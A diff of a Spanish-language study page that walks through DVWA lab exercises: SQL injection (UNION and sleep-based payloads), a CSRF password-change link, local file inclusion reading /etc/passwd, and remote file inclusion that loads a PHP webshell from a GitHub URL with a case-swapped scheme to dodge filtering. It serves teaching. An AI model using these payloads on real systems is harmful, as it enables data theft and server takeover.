-                                    que causan retrasos en la respuesta del servidor. El atacante puede inferir
-                                    información sobre la base de datos basándose en el tiempo que tarda en responder.
-                                </li>
-                                <li>
-                                    <b>Inyección SQL Ciega:</b> En este caso, el atacante no recibe mensajes de error
-                                    que revelen información sobre la base de datos, pero puede hacer preguntas que
-                                    devuelvan respuestas verdaderas o falsas. A través de este método, el atacante puede
-                                    deducir información sobre la base de datos sin ver los resultados directamente.
-                                </li>
-                            </ul>
-                            <p>
-                                Las consecuencias de un ataque de inyección SQL pueden incluir el acceso no autorizado a
-                                datos sensibles, la modificación o eliminación de datos, y la posibilidad de comprometer
-                                la integridad de la base de datos. Para prevenir la inyección SQL, es fundamental
-                                utilizar consultas parametrizadas, validar y escapar adecuadamente todos los datos de
-                                entrada y aplicar principios de seguridad en el diseño de la base de datos.
-                            </p>
-                            <h4>Extra</h4>
-                            <p>
-                                A modo de información adicional, estas son algunas de las formas para sacar información
-                                sensible del cuerpo de una base de datos en MySQL o cualquier base de datos SQL
-                            </p>
-                            <ul>
-                                <li><b>Numero de columnas:</b> order by X</li>
-                                <li><b>Nombre de la base de datos:</b> database()</li>
-                                <li><b>Todas las bases de datos:</b> schema_name from information_schema.schemata</li>
-                                <li>
-                                    <b>Todas las tablas de la base de datos:</b> table_name from
-                                    information_schema.tables
-                                </li>
-                                <li><b>Todas las columnas:</b> column:name from information_schema.column</li>
-                            </ul>
-                        </div>
+                <div class="expandable-card">
+                    <div class="card-header" onclick="toggleCard(this)">
+                        <h3>Inyección SQL - Conceptos.</h3>
                     </div>
+                    <div class="card-content">
+                        <p>
+                            La inyección SQL (SQL Injection) es una vulnerabilidad de seguridad en aplicaciones web
+                            que permite a un atacante interferir en las consultas que una aplicación realiza a su
+                            base de datos. Esto ocurre cuando una aplicación web no valida o escapa adecuadamente
+                            los datos de entrada proporcionados por el usuario, permitiendo que un atacante ejecute
+                            comandos SQL maliciosos que pueden manipular o acceder a datos sensibles.
+                        </p>
+                        <p>Existen varios tipos de inyección SQL, entre los que se destacan:</p>
+                        <ul>
+                            <li>
+                                <b>Inyección SQL Clásica:</b> El atacante inserta código SQL malicioso en un campo
+                                de entrada, como un formulario de inicio de sesión, que se ejecuta en la base de
+                                datos. Este tipo de ataque puede permitir al atacante obtener acceso no autorizado a
+                                datos o incluso modificar la base de datos.
+                            </li>
+                            <li>
+                                <b>Inyección SQL Basada en Tiempo:</b> Este tipo de inyección se utiliza para
+                                determinar la estructura de la base de datos mediante la introducción de consultas
+                                que causan retrasos en la respuesta del servidor. El atacante puede inferir
+                                información sobre la base de datos basándose en el tiempo que tarda en responder.
+                            </li>
+                            <li>
+                                <b>Inyección SQL Ciega:</b> En este caso, el atacante no recibe mensajes de error
+                                que revelen información sobre la base de datos, pero puede hacer preguntas que
+                                devuelvan respuestas verdaderas o falsas. A través de este método, el atacante puede
+                                deducir información sobre la base de datos sin ver los resultados directamente.
+                            </li>
+                        </ul>
+                        <p>
+                            Las consecuencias de un ataque de inyección SQL pueden incluir el acceso no autorizado a
+                            datos sensibles, la modificación o eliminación de datos, y la posibilidad de comprometer
+                            la integridad de la base de datos. Para prevenir la inyección SQL, es fundamental
+                            utilizar consultas parametrizadas, validar y escapar adecuadamente todos los datos de
+                            entrada y aplicar principios de seguridad en el diseño de la base de datos.
+                        </p>
+                        <h4>Extra</h4>
+                        <p>
+                            A modo de información adicional, estas son algunas de las formas para sacar información
+                            sensible del cuerpo de una base de datos en MySQL o cualquier base de datos SQL
+                        </p>
+                        <ul>
+                            <li><b>Numero de columnas:</b> order by X</li>
+                            <li><b>Nombre de la base de datos:</b> database()</li>
+                            <li><b>Todas las bases de datos:</b> schema_name from information_schema.schemata</li>
+                            <li>
+                                <b>Todas las tablas de la base de datos:</b> table_name from
+                                information_schema.tables
+                            </li>
+                            <li><b>Todas las columnas:</b> column:name from information_schema.column</li>
+                        </ul>
+                    </div>
+                </div>
 
-                    <div class="expandable-card">
-                        <div class="card-header" onclick="toggleCard(this)">
-                            <h3>Inyección SQL Clasica.</h3>
-                        </div>
-                        <div class="card-content">
-                            <p>
-                                Para dar como superado el ejercicio deberemos de haber sido capaz de obtener información
-                                privada/sensible que el servidor no quiera mostrar, como podria ser el nombre de las
-                                base de datos o el nombre de las tablas
-                            </p>
-                            <h4>Dificultad baja</h4>
-                            <p>Codigo fuente en php:</p>
-                            <pre>
+                <div class="expandable-card">
+                    <div class="card-header" onclick="toggleCard(this)">
+                        <h3>Inyección SQL Clasica.</h3>
+                    </div>
+                    <div class="card-content">
+                        <p>
+                            Para dar como superado el ejercicio deberemos de haber sido capaz de obtener información
+                            privada/sensible que el servidor no quiera mostrar, como podria ser el nombre de las
+                            base de datos o el nombre de las tablas
+                        </p>
+                        <h4>Dificultad baja</h4>
+                        <p>Codigo fuente en php:</p>
+                        <pre>
 &lt;?php
 if( isset( $_REQUEST[ 'Submit' ] ) ) {
     // Get input
@@ -581,30 +568,26 @@ if( isset( $_REQUEST[ 'Submit' ] ) ) {
     } 
 }
 
-?&gt;</pre
-                            >
-                            <p>
-                                Como se puede apreciar en el codigo, si sabemos un poco de <b>PHP/SQL</b> el codigo no
-                                trae ningún tipo de proteción y esta utilizando comillas simples en la query, por lo que
-                                si introducimos una consulta simple como podria ser <b>' or '1'='1</b>, obtendremos
-                                todos los datos que se muestran, pero para nosotros esto no es suficiente por lo que
-                                obtendremos el nombre de todas las tablas con la query
-                                <b
-                                    >' or '1'='1' UNION SELECT database(),table_name from information_schema.tables; --
-                                    -</b
-                                >
-                                funcionara
-                            </p>
-                            <pre>
-' or '1'='1' UNION SELECT database(),table_name from information_schema.tables; -- -</pre
-                            >
-                            <div class="image-card">
-                                <img src="../img/wip.png" alt="En progreso..." />
-                            </div>
-                            <br /><br />
-                            <h4>Dificultad media</h4>
-                            <p>Codigo fuente en php:</p>
-                            <pre>
+?&gt;</pre>
+                        <p>
+                            Como se puede apreciar en el codigo, si sabemos un poco de <b>PHP/SQL</b> el codigo no
+                            trae ningún tipo de proteción y esta utilizando comillas simples en la query, por lo que
+                            si introducimos una consulta simple como podria ser <b>' or '1'='1</b>, obtendremos
+                            todos los datos que se muestran, pero para nosotros esto no es suficiente por lo que
+                            obtendremos el nombre de todas las tablas con la query
+                            <b>' or '1'='1' UNION SELECT database(),table_name from information_schema.tables; --
+                                -</b>
+                            funcionara
+                        </p>
+                        <pre>
+' or '1'='1' UNION SELECT database(),table_name from information_schema.tables; -- -</pre>
+                        <div class="image-card">
+                            <img src="../img/wip.png" alt="En progreso..." />
+                        </div>
+                        <br /><br />
+                        <h4>Dificultad media</h4>
+                        <p>Codigo fuente en php:</p>
+                        <pre>
 &lt;?php
 if( isset( $_POST[ 'Submit' ] ) ) {
     // Get input
@@ -663,38 +646,35 @@ $number_of_rows = mysqli_fetch_row( $result )[0];
 
 mysqli_close($GLOBALS["___mysqli_ston"]);
 ?&gt;                            
-                        </pre
-                            >
-                            <p>
-                                Como se puede ver en el codigo fuente, esta vez tiene una pequeña sanitización la cual
-                                aplica <b>mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $id)</b> a los datos que
-                                estamos introduciendo, ademas de esto, no tenemos un campo donde podamos escribir
-                                directamente, por lo que necesitaremos modificar el HTML para introducir lo que
-                                queramos, por lo que si volvemos a utilizar el input anterior esta vez nos dara un
-                                error. Si vamos a la documentación de <b>PHP</b> y buscamos por
-                                mysqli_real_escape_string() podremos ver lo que hace la función
-                            </p>
-                            <div class="image-card">
-                                <img
-                                    src="../img/mysqliRealScapeDefinition.png"
-                                    alt="Muestra el funcionamiento en la documentación de php de mysqli_real_escape_string"
-                                />
-                            </div>
-                            <p>
-                                Por lo que si ponemos una comilla, esta sera escapada por la función, pero para nuestra
-                                suerte si miramos la consulta, no hay comillas, esta puesto tal cual. Gracias a esto
-                                solamente tendremos que hacer la consulta sin poner ninguna comilla
-                                <b>1 UNION SELECT database(),table_name from information_schema.tables; -- -</b> y
-                                funcionara correctamente
-                            </p>
-                            <pre>1 UNION SELECT database(),table_name from information_schema.tables; -- -</pre>
-                            <div class="image-card">
-                                <img src="../img/wip.png" alt="En progreso..." />
-                            </div>
-                            <br /><br />
-                            <h4>Dificultad alta</h4>
-                            <p>Codigo fuente en php:</p>
-                            <pre>
+                        </pre>
+                        <p>
+                            Como se puede ver en el codigo fuente, esta vez tiene una pequeña sanitización la cual
+                            aplica <b>mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $id)</b> a los datos que
+                            estamos introduciendo, ademas de esto, no tenemos un campo donde podamos escribir
+                            directamente, por lo que necesitaremos modificar el HTML para introducir lo que
+                            queramos, por lo que si volvemos a utilizar el input anterior esta vez nos dara un
+                            error. Si vamos a la documentación de <b>PHP</b> y buscamos por
+                            mysqli_real_escape_string() podremos ver lo que hace la función
+                        </p>
+                        <div class="image-card">
+                            <img src="../img/mysqliRealScapeDefinition.png"
+                                alt="Muestra el funcionamiento en la documentación de php de mysqli_real_escape_string" />
+                        </div>
+                        <p>
+                            Por lo que si ponemos una comilla, esta sera escapada por la función, pero para nuestra
+                            suerte si miramos la consulta, no hay comillas, esta puesto tal cual. Gracias a esto
+                            solamente tendremos que hacer la consulta sin poner ninguna comilla
+                            <b>1 UNION SELECT database(),table_name from information_schema.tables; -- -</b> y
+                            funcionara correctamente
+                        </p>
+                        <pre>1 UNION SELECT database(),table_name from information_schema.tables; -- -</pre>
+                        <div class="image-card">
+                            <img src="../img/wip.png" alt="En progreso..." />
+                        </div>
+                        <br /><br />
+                        <h4>Dificultad alta</h4>
+                        <p>Codigo fuente en php:</p>
+                        <pre>
 &lt;?php
 if( isset( $_SESSION [ 'id' ] ) ) {
     // Get input
@@ -746,44 +726,40 @@ if( isset( $_SESSION [ 'id' ] ) ) {
     }
 }
 
-?&gt;</pre
-                            >
-                            <p>
-                                Como se puede apreciar en el codigo, esta vez la sanitización es incluso menor que en el
-                                ejercicio anterior, siendo que la sanitización se fundamente en un <b>LIMIT 1</b>,
-                                haciendo que aunque introduzcas <b>' or '1'='1</b> de manera efectiva, este solo
-                                mostrara un elemento, para contrasrestar esta medida, solamente tendremos que añadirle
-                                un comentario a nuestro codigo, haciendo que no interprete el LIMIT 1. Por lo que
-                                introduciremos
-                                <b
-                                    >' or '1'='1' UNION SELECT database(),table_name from information_schema.tables; --
-                                    -</b
-                                >
-                                y esto funcionara perfectamente
-                            </p>
-                            <pre>
-' or '1'='1' UNION SELECT database(),table_name from information_schema.tables; -- -</pre
-                            >
-                            <div class="image-card">
-                                <img src="../img/wip.png" alt="En progreso..." />
-                            </div>
+?&gt;</pre>
+                        <p>
+                            Como se puede apreciar en el codigo, esta vez la sanitización es incluso menor que en el
+                            ejercicio anterior, siendo que la sanitización se fundamente en un <b>LIMIT 1</b>,
+                            haciendo que aunque introduzcas <b>' or '1'='1</b> de manera efectiva, este solo
+                            mostrara un elemento, para contrasrestar esta medida, solamente tendremos que añadirle
+                            un comentario a nuestro codigo, haciendo que no interprete el LIMIT 1. Por lo que
+                            introduciremos
+                            <b>' or '1'='1' UNION SELECT database(),table_name from information_schema.tables; --
+                                -</b>
+                            y esto funcionara perfectamente
+                        </p>
+                        <pre>
+' or '1'='1' UNION SELECT database(),table_name from information_schema.tables; -- -</pre>
+                        <div class="image-card">
+                            <img src="../img/wip.png" alt="En progreso..." />
                         </div>
                     </div>
+                </div>
 
-                    <div class="expandable-card">
-                        <div class="card-header" onclick="toggleCard(this)">
-                            <h3>Inyección SQL Ciegas.</h3>
-                        </div>
-                        <div class="card-content">
-                            <p>
-                                Al ser inyecciones SQL Ciegas para dar como superado el ejercicio deberemos de haber
-                                sido capaz de demostrar la existencia de información que la base de datos no nos
-                                proporciona, como podria ser el nombre de una tabla y que el servidor nos diga que
-                                existe
-                            </p>
-                            <h4>Dificultad baja</h4>
-                            <p>Codigo fuente en php:</p>
-                            <pre>
+                <div class="expandable-card">
+                    <div class="card-header" onclick="toggleCard(this)">
+                        <h3>Inyección SQL Ciegas.</h3>
+                    </div>
+                    <div class="card-content">
+                        <p>
+                            Al ser inyecciones SQL Ciegas para dar como superado el ejercicio deberemos de haber
+                            sido capaz de demostrar la existencia de una inyección SQL, esto lo haremos usandos sleep(),
+                            ya que si quisieramos obtener información más util a partir de una inyección blind,
+                            utilizariamos herramientas automatizadas
+                        </p>
+                        <h4>Dificultad baja</h4>
+                        <p>Codigo fuente en php:</p>
+                        <pre>
 &lt;?php
 if( isset( $_GET[ 'Submit' ] ) ) {
     // Get input
@@ -839,51 +815,431 @@ if( isset( $_GET[ 'Submit' ] ) ) {
 
 }
 
-?&gt;</pre
-                            >
-                            <p>
-                                Al igual que en la inyección SQL Basica, no hay ninguna sanitización en el codigo, pero
-                                por desgracia, lo unico que nos mostrara es que existe, por lo que si introducimos
-                                <b>' or '1'='1</b>, no veremos nada, ademas del existe.
-                            </p>
+?&gt;</pre>
+                        <p>
+                            Al igual que en la inyección SQL Basica, no hay ninguna sanitización en el codigo, pero
+                            por desgracia, lo unico que nos mostrara es que existe, por lo que si introducimos
+                            <b>' or '1'='1</b>, no veremos nada, ademas del existe.
+                        </p>
+                        <p>Por lo que deberemos de optar por otro tipo de inyecciones, como podria ser la siguiente
+                            <b>1' and sleep(5)#</b> tardando 5 segundos para mostrar un resultado, demostrando que es
+                            vulnerable a inyecciones SQL
+                        </p>
+                        <pre>1' and sleep(5)#</pre>
+                        <div class="image-card">
+                            <img src="../img/wip.png" alt="En progreso..." />
+                        </div>
+                        <br /><br />
+                        <h4>Dificultad media</h4>
+                        <p>Codigo fuente en php:</p>
+                        <pre>
+                            &lt;?php
+if( isset( $_POST[ 'Submit' ]  ) ) {
+    // Get input
+    $id = $_POST[ 'id' ];
+    $exists = false;
 
-                            <br /><br />
-                            <h4>Dificultad media</h4>
-                            <p>Codigo fuente en php:</p>
+    switch ($_DVWA['SQLI_DB']) {
+        case MYSQL:
+            $id = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $id ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
+
+            // Check database
+            $query  = "SELECT first_name, last_name FROM users WHERE user_id = $id;";
+            try {
+                $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ); // Removed 'or die' to suppress mysql errors
+            } catch (Exception $e) {
+                print "There was an error.";
+                exit;
+            }
+
+            $exists = false;
+            if ($result !== false) {
+                try {
+                    $exists = (mysqli_num_rows( $result ) &gt; 0); // The '@' character suppresses errors
+                } catch(Exception $e) {
+                    $exists = false;
+                }
+            }
+            
+            break;
+        case SQLITE:
+            global $sqlite_db_connection;
+            
+            $query  = "SELECT first_name, last_name FROM users WHERE user_id = $id;";
+            try {
+                $results = $sqlite_db_connection->query($query);
+                $row = $results->fetchArray();
+                $exists = $row !== false;
+            } catch(Exception $e) {
+                $exists = false;
+            }
+            break;
+    }
+
+    if ($exists) {
+        // Feedback for end user
+        echo '&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;';
+    } else {
+        // Feedback for end user
+        echo '&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;';
+    }
+}
+
+?&gt;</pre>
+                        <p>Al igual que en las inyecciones SQL Clasicas en dificultad media, la dificultad realmente
+                            reside en entender la query que se esta procesando, ya que si pusieramos la misma de antes
+                            <b>1' and sleep(5)#</b> no funcionara. Ya que estamos poniendo comillas cuando en el
+                            procesamiento de la query no hay comillas, por lo que si lo ponemos sin comillas <b>1 and
+                                sleep(5)#</b> funcionara correctamente
+                        </p>
+                        <pre>1 and sleep(5)#</pre>
+                        <div class="image-card">
+                            <img src="../img/wip.png" alt="En progreso..." />
+                        </div>
+                        <br /><br />
+                        <h4>Dificultad alta</h4>
+                        <p>Codigo fuente en php:</p>
+                        <pre>
+&lt;?php
+
+if( isset( $_COOKIE[ 'id' ] ) ) {
+    // Get input
+    $id = $_COOKIE[ 'id' ];
+    $exists = false;
+
+    switch ($_DVWA['SQLI_DB']) {
+        case MYSQL:
+            // Check database
+            $query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;";
+            try {
+                $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ); // Removed 'or die' to suppress mysql errors
+            } catch (Exception $e) {
+                $result = false;
+            }
+
+            $exists = false;
+            if ($result !== false) {
+                // Get results
+                try {
+                    $exists = (mysqli_num_rows( $result ) &gt; 0); // The '@' character suppresses errors
+                } catch(Exception $e) {
+                    $exists = false;
+                }
+            }
+
+            ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
+            break;
+        case SQLITE:
+            global $sqlite_db_connection;
+
+            $query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;";
+            try {
+                $results = $sqlite_db_connection->query($query);
+                $row = $results->fetchArray();
+                $exists = $row !== false;
+            } catch(Exception $e) {
+                $exists = false;
+            }
+
+            break;
+    }
+
+    if ($exists) {
+        // Feedback for end user
+        echo '&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;';
+    }
+    else {
+        // Might sleep a random amount
+        if( rand( 0, 5 ) == 3 ) {
+            sleep( rand( 2, 4 ) );
+        }
+
+        // User wasn't found, so the page wasn't!
+        header( $_SERVER[ 'SERVER_PROTOCOL' ] . ' 404 Not Found' );
+
+        // Feedback for end user
+        echo '&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;';
+    }
+}
+
+?&gt;</pre>
+                        <p>La unica sanitización que tiene en este caso es un <b>Limit</b>, la cual podemos sobrepasar
+                            poniendo un comentario como hemos hecho anteriormente por lo que la inyección que usamos en
+                            el primer nivel <b>1' and sleep(5)#</b>, tambien valdira en este nivel.</p>
+                        <pre>1' and sleep(5)#</pre>
+                        <div class="image-card">
+                            <img src="../img/wip.png" alt="En progreso..." />
                         </div>
                     </div>
+                </div>
 
-                    <!-- Más tarjetas aquí -->
-                </section>
-            </main>
+                <div class="expandable-card">
+                    <div class="card-header" onclick="toggleCard(this)">
+                        <h3>CSRF - Conceptos y ejercicios.</h3>
+                    </div>
+                    <div class="card-content">
+                        <p>
+                            La falsificación de solicitudes entre sitios (CSRF, por sus siglas en inglés) es una
+                            vulnerabilidad de seguridad en aplicaciones web que permite a un atacante inducir a un
+                            usuario a realizar acciones no deseadas en una aplicación en la que está autenticado. Esto
+                            ocurre cuando un atacante engaña a un usuario para que envíe una solicitud no intencionada a
+                            una aplicación web, aprovechando la sesión activa del usuario.
+                        </p>
+                        <p>
+                            Al ser una vulnerabilidad CSRF, y tal cocmo esta en DVWA, daremos como superado cuando
+                            consigamos generar un enlace que al clickarlo cambien la contraseña del usuario a
+                            <b>admin</b> (o cualquier otra, utilizaremos esta para evitar confunsiones).
+                        </p>
+                        <h4>Dificultad baja.</h4>
+                        <p>Codigo fuente en php:</p>
+                        <pre>
+&lt;?php
 
-            <!-- Pie de página -->
-            <footer>
-                <p>Pablo Valladares González &copy; 2025 Apuntes de CETI. Todos los derechos reservados.</p>
-            </footer>
+if( isset( $_GET[ 'Change' ] ) ) {
+    // Get input
+    $pass_new  = $_GET[ 'password_new' ];
+    $pass_conf = $_GET[ 'password_conf' ];
+
+    // Do the passwords match?
+    if( $pass_new == $pass_conf ) {
+        // They do!
+        $pass_new = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_new ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
+        $pass_new = md5( $pass_new );
+
+        // Update the database
+        $current_user = dvwaCurrentUser();
+        $insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . $current_user . "';";
+        $result = mysqli_query($GLOBALS["___mysqli_ston"],  $insert ) or die( '&lt;pre&gt;' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '&lt;/pre&gt;' );
+
+        // Feedback for the user
+        echo "&lt;pre&gt;Password Changed.&lt;/pre&gt;";
+    }
+    else {
+        // Issue with passwords matching
+        echo "&lt;pre&gt;Passwords did not match.&lt;/pre&gt;";
+    }
+
+    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
+}
+
+?&gt;</pre>
+                        <p>Como se puede ver en el codigo fuente, no hay sanitización, solamente hay una comprobación de
+                            si las contraseñas son iguales, por lo que cambiaremos nuestra contraseña y copiaremos el
+                            enlace que se genera, siendo asi este enlace el que cambiara la contraseña al usuario</p>
+                        <pre>http://localhost:4280/vulnerabilities/csrf/?password_new=admin&password_conf=admin&Change=Change#</pre>
+                        <div class="image-card">
+                            <img src="../img/wip.png" alt="En progreso..." />
+                        </div>
+                        <br /><br />
+                        <h4>Dificultad media.</h4>
+                        <p>Codigo fuente en php:</p>
+                    </div>
+                </div>
+
+                <div class="expandable-card">
+                    <div class="card-header" onclick="toggleCard(this)">
+                        <h3>File Inclusion - Conceptos.</h3>
+                    </div>
+                    <div class="card-content">
+                        <p>
+                            La inclusión de archivos (File Inclusion) es una vulnerabilidad de seguridad en aplicaciones
+                            web que permite a un atacante incluir archivos del sistema en el contexto de la aplicación.
+                            Esto puede llevar a la ejecución de código malicioso, divulgación de información sensible o
+                            incluso el control total del servidor. La vulnerabilidad se produce cuando una aplicación
+                            web no valida adecuadamente las rutas de los archivos proporcionadas por el usuario,
+                            permitiendo que se incluyan archivos no autorizados.
+                        </p>
+                        <p>Existen dos tipos principales de inclusión de archivos:</p>
+                        <ul>
+                            <li><b>Inclusión de Archivos Local (LFI - Local File Inclusion):</b> Este tipo de ataque
+                                permite a un atacante incluir archivos que están presentes en el servidor. Por ejemplo,
+                                si una aplicación permite que un usuario especifique un archivo para incluir, un
+                                atacante podría manipular la entrada para acceder a archivos sensibles del sistema, como
+                                archivos de configuración o contraseñas.</li>
+                            <li><b>Inclusión de Archivos Remota (RFI - Remote File Inclusion):</b> En este caso, el
+                                atacante puede incluir archivos que están alojados en un servidor remoto. Esto es más
+                                peligroso, ya que permite al atacante ejecutar código malicioso que reside en un
+                                servidor externo. Para que esto ocurra, la aplicación debe estar configurada para
+                                permitir la inclusión de archivos desde URLs externas.</li>
+                        </ul>
+                        <p>Las consecuencias de un ataque de inclusión de archivos pueden ser graves e incluir la
+                            ejecución de código arbitrario, la exposición de datos sensibles, la toma de control del
+                            servidor y la posibilidad de comprometer otros sistemas en la red. Para prevenir la
+                            inclusión de archivos, es crucial validar y sanitizar todas las entradas del usuario,
+                            restringir el acceso a archivos sensibles y deshabilitar la inclusión de archivos remotos
+                            siempre que sea posible.</p>
+                    </div>
+                </div>
+
+                <div class="expandable-card">
+                    <div class="card-header" onclick="toggleCard(this)">
+                        <h3>Local File Inclusion.</h3>
+                    </div>
+                    <div class="card-content">
+                        <p>
+                            Para dar como superado el ejercicio deberemos de haber sido capaz de mostrar el contenido
+                            del archivo <b>passwd</b>, el cual se suele encontrar en <b>/etc/passwd</b>
+                        </p>
+                        <h4>Dificultad baja.</h4>
+                        <p>Codigo fuente en php:</p>
+                        <pre>
+&lt;?php
+
+// The page we wish to display
+$file = $_GET[ 'page' ];
+
+?&gt;</pre>
+                        <p>Como se puede apreciar en el codigo, no hay ningún tipo de sanitización, solamente tiene un
+                            include, por lo que si añadimos cualquier dato a la URL este archivo sera mostrado, por lo
+                            que si añadimos <b>/etc/passwd</b> a la url deberia de mostrar su contenido</p>
+                        <pre>/etc/passwd</pre>
+                        <div class="image-card">
+                            <img src="../img/wip.png" alt="En progreso..." />
+                        </div>
+                        <br /><br />
+                        <h4>Dificultad media.</h4>
+                        <p>Codigo fuente en php:</p>
+                        <pre>
+&lt;?php
+
+// The page we wish to display
+$file = $_GET[ 'page' ];
+
+// Input validation
+$file = str_replace( array( "http://", "https://" ), "", $file );
+$file = str_replace( array( "../", "..\\" ), "", $file );
+
+?&gt;</pre>
+                        <p>Como podemos ver, en este caso la sanitización que se esta aplicando (que nos afecta para un
+                            Local File inclusión) es solamente un <b>str_replace</b> de ../ y ..\\, siendo así que no
+                            podamos ir marcha atras para buscar archivos, pero si que podremos utilizar rutas absolutas
+                            como hemos hecho anteriormente con <b>/etc/passwd</b></p>
+                        <pre>/etc/passwd</pre>
+                        <br /><br />
+                        <h4>Dificultad alta.</h4>
+                        <p>Codigo fuente en php:</p>
+                        <pre>
+&lt;?php
+
+// The page we wish to display
+$file = $_GET[ 'page' ];
+
+// Input validation
+if( !fnmatch( "file*", $file ) && $file != "include.php" ) {
+    // This isn't the page we want!
+    echo "ERROR: File not found!";
+    exit;
+}
+
+?&gt;</pre>
+                        <p>Como se puede apreciar, en este caso la sanitización es más elevada, siendo asi que solo se
+                            permitan archivos que empiecen por file o que su nombre sea include.php, por lo que si
+                            intentamos hacer /etc/passwd como anteriormente no funcionara. Pero si investigamos un poco
+                            llegaremos a encontrar <b>File URI scheme</b>, siendo gracias a esto por lo que sabemos si
+                            ponemos <b>file:///</b> cargara el archivo que le indiquemos que este en el host, siendo asi
+                            que tenemos que introducir <b>file:///etc/passwd</b> y funcionara.</p>
+                        <pre>file:///etc/passwd</pre>
+                        <div class="image-card">
+                            <img src="../img/wip.png" alt="En progreso..." />
+                        </div>
+                    </div>
+                </div>
+
+                <div class="expandable-card">
+                    <div class="card-header" onclick="toggleCard(this)">
+                        <h3>Remote File Inclusion.</h3>
+                    </div>
+                    <div class="card-content">
+                        <p>Para dar como superado el ejercicio deberemos de ser capaces de introducir una url externa,
+                            para mayor utilidad, la url que introduzcamos debera ser una <b>websehll</b>, en nuestro
+                            caso usaremos <a
+                                href="https://raw.githubusercontent.com/JohnTroony/php-webshells/refs/heads/master/Collection/Rootshell.v.1.0.php">Rootshell.v.1.0</a>
+                        </p>
+                        <h4>Dificultad baja.</h4>
+                        <p>Codigo fuente en php:</p>
+                        <pre>
+&lt;?php
+
+// The page we wish to display
+$file = $_GET[ 'page' ];
+
+?&gt;</pre>
+                        <p>Como hemos visto no hay ningún tipo de proteción, por lo que si añadimos la url directamente
+                            funcionara, siendo esta:</p>
+                        <pre>https://raw.githubusercontent.com/JohnTroony/php-webshells/refs/heads/master/Collection/Rootshell.v.1.0.php</pre>
+                        <div class="image-card">
+                            <img src="../img/wip.png" alt="En progreso..." />
+                        </div>
+                        <br /><br />
+                        <h4>Dificultad media.</h4>
+                        <p>Codigo fuente en php:</p>
+                        <pre>
+&lt;?php
+
+// The page we wish to display
+$file = $_GET[ 'page' ];
+
+// Input validation
+$file = str_replace( array( "http://", "https://" ), "", $file );
+$file = str_replace( array( "../", "..\\" ), "", $file );
+
+?&gt;</pre>
+                        <p>Como podemos ver, esta vez si hay una sanitización a la url, (que nos afecta al remote file
+                            inclusion), siendo esta un <b>str_replace/b> a las palabras <b>http:// y https://</b>, si
+                                miramos la documentación de PHP y buscamos dicha función, podremos ver lo siguiente:</p>
+                        <div class="image-card">
+                            <img src="../img/nota_str_replace.png"
+                                alt="Nota de la documentación de PHP sobre str_replace" />
+                        </div>
+                        <p>Como podemos ver, no reemplaza las mayusculas, por lo que si cambiamos el https:// por
+                            <b>HttPs://</b>, funcionara correctamente siendo la url final esta
+                            HttPs://raw.githubusercontent.com/JohnTroony/php-webshells/refs/heads/master/Collection/Rootshell.v.1.0.php
+                        </p>
+                        <pre>
+                            HttPs://raw.githubusercontent.com/JohnTroony/php-webshells/refs/heads/master/Collection/Rootshell.v.1.0.php
+                        </pre>
+                        <div class="image-card">
+                            <img src="../img/wip.png" alt="En progreso..." />
+                        </div>
+                        <br /><br />
+                        <p>En este caso la dificultad alta no es posible de hacerla mediante RFI, ya que está esta
+                            diseñada para hacerse con LFI y no RFI.</p>
+                    </div>
+                </div>
+
+
+                <!-- Más tarjetas aquí -->
+            </section>
+        </main>
+
+        <!-- Pie de página -->
+        <footer>
+            <p>Pablo Valladares González &copy; 2025 Apuntes de CETI. Todos los derechos reservados.</p>
+        </footer>
+    </div>
+
+    <!-- Disclaimer -->
+    <div id="disclaimer" class="disclaimer">
+        <div class="disclaimer-header">
+            <h3>Advertencia</h3>
+            <button id="close-disclaimer" class="close-button">×</button>
         </div>
+        <div class="disclaimer-line"></div>
+        <p>
+            Esta página no promueve o incita a cometer ninguna acción ilegal, todo el contenido proporcionado está
+            diseñado para ser solamente educativo.
+        </p>
+    </div>
 
-        <!-- Disclaimer -->
-        <div id="disclaimer" class="disclaimer">
-            <div class="disclaimer-header">
-                <h3>Advertencia</h3>
-                <button id="close-disclaimer" class="close-button">×</button>
-            </div>
-            <div class="disclaimer-line"></div>
-            <p>
-                Esta página no promueve o incita a cometer ninguna acción ilegal, todo el contenido proporcionado está
-                diseñado para ser solamente educativo.
-            </p>
-        </div>
+    <script>
+        // Función para expandir/colapsar las tarjetas
+        function toggleCard(header) {
+            const card = header.parentElement;
+            const content = card.querySelector(".card-content");
+            content.classList.toggle("expanded");
+        }
+    </script>
+    <script src="../script.js"></script>
+</body>
 
-        <script>
-            // Función para expandir/colapsar las tarjetas
-            function toggleCard(header) {
-                const card = header.parentElement;
-                const content = card.querySelector(".card-content");
-                content.classList.toggle("expanded");
-            }
-        </script>
-        <script src="../script.js"></script>
-    </body>
 </html>
